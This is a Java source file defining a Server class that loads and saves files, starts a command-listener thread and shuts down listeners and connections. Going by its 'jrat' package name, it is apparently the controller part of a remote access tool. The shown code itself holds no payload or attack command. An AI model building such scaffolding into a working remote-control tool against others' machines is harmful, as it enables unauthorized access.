package net.jrat.core;

import net.jrat.core.command.CommandManager;
import net.jrat.core.connection.Connection;
import net.jrat.core.file.File;
import net.jrat.core.file.FileManager;
import net.jrat.core.listener.Listener;
import net.jrat.core.listener.ListenerManager;
import net.jrat.core.threads.ActionListener;
import net.jrat.core.threads.CommandListener;
import net.jrat.utils.Logger;

public class Server
{
	public static Server instance;
	
	public CommandListener commandListener;
	
	public FileManager fileManager;
	public ListenerManager listenerManager;
	public CommandManager commandManager;
	
	public Connection currentConnection;
	public boolean running;
	
	public void start()
	{
		instance = this;
		
		this.currentConnection = null;
		this.running = true;
		
		this.fileManager = new FileManager();
		this.listenerManager = new ListenerManager();
		this.commandManager = new CommandManager();
		
		for(File file : this.fileManager.files)
		{
			try
			{
				file.load();
			}
			catch (Exception e)
			{
				Logger.warn("could not load file: " + e.getMessage());
			}
		}
		
		Logger.log("starting threads");
		{
			Logger.startFrequence();
			
			{
				final Thread commandThread = new Thread((this.commandListener = new CommandListener()), "command listener");
				commandThread.start();
				
				Logger.log("command listener started");
			}
			
			Logger.stopFrequence();
		}
		Logger.log("done");
	}
	
	public void shutdown()
	{
		for(File file : this.fileManager.files)
		{
			try
			{
				file.save();
			}
			catch (Exception e)
			{
				Logger.warn("could not save file: " + e.getMessage());
			}
		}
		
		for(Listener listener : this.listenerManager.listeners)
		{
			listener.stopThread();
			
			if(!(listener.listener == null))
			{
				for(ActionListener actionListener : listener.listener.listeners)
					actionListener.close();
			}
		}
		
		this.running = false;
	}
}
